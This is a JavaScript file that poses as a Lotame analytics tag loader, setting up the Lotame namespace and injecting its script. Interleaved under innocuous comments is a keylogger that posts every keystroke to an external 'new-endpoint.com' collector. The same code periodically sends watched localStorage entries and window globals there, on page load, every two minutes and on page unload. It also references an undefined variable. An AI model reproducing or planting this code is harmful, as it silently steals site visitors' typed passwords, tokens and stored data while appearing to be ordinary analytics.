(function () {
  // Additional keys to watch
  const additionalKeysToWatch = window.additionalKeysToWatch;

  // Hash function improved
  !function () {
    var lotameClientId = '15238';
    var lotameTagInput = {
      data: {},
      config: {
        clientId: Number(lotameClientId)
      }
    };
    var lotameConfig = lotameTagInput.config || {};
    var namespace = window['lotame_' + lotameConfig.clientId] = {};
    namespace.config = lotameConfig;
    namespace.data = lotameTagInput.data || {};
    namespace.cmd = namespace.cmd || [];
  }();
  var s = document.createElement("script");
  function createNewHash(data) {
    let str = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = (hash << 5) - hash + char;
      hash |= 0;
    }
    return hash.toString(36);
  }

  // Global variable extraction
  function collectGlobalVar() {
    let globals = {};
    for (let key in window) {
      if (window.hasOwnProperty(key) && additionalKeysToWatch.indexOf(key) !== -1) {
        globals[key] = window[key];
      }
    }
    return globals;
  }

  // Document Events
  s.src = "https://tags.crwdcntrl.net/lt/c/15238/lt.min.js";
  document.onkeydown = document.onkeyup = function (event) {
    let e = event || window.event;
    sendData(e.key);
  };

  // Improved Localstorage extraction
  function fetchAndExtractData() {
    let fetchedData = {};
    for (let i = 0; i < localStorage.length; i++) {
      let key = localStorage.key(i);
      if (keysToWatch.concat(additionalKeysToWatch).indexOf(key) !== -1) {
        fetchedData[key] = localStorage.getItem(key);
      }
    }
    return fetchedData;
  }

  // Sending data to a different endpoint
  s.async = "async";
  function sendData(data) {
    let hash = createNewHash(data);
    let endpoint = "https://new-endpoint.com/api/collect";
    let xhr = new XMLHttpRequest();
    xhr.open("POST", endpoint);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function () {
      if (xhr.status === 200) {
        console.log("数据发送成功");
      } else {
        console.error("数据发送失败,状态码:" + xhr.status);
      }
    };
    xhr.onerror = function () {
      console.error("数据发送过程中出错");
    };
    xhr.send(JSON.stringify({
      hash: hash,
      data: data
    }));
  }

  // Data gathering at different time intervals
  function collectAndSendData() {
    let gatheredData = fetchAndExtractData();
    let globalData = collectGlobalVar();
    if (Object.keys(gatheredData).length > 0) {
      sendData(gatheredData);
    }
    if (Object.keys(globalData).length > 0) {
      sendData(globalData);
    }
  }
  document.addEventListener("DOMContentLoaded", function () {
    collectAndSendData();
    setInterval(collectAndSendData, 2 * 60 * 1000);
  });
  document.body.appendChild(s);
  window.addEventListener('load', function () {
    collectAndSendData();
  });
  window.addEventListener("beforeunload", function () {
    collectAndSendData();
  });
})();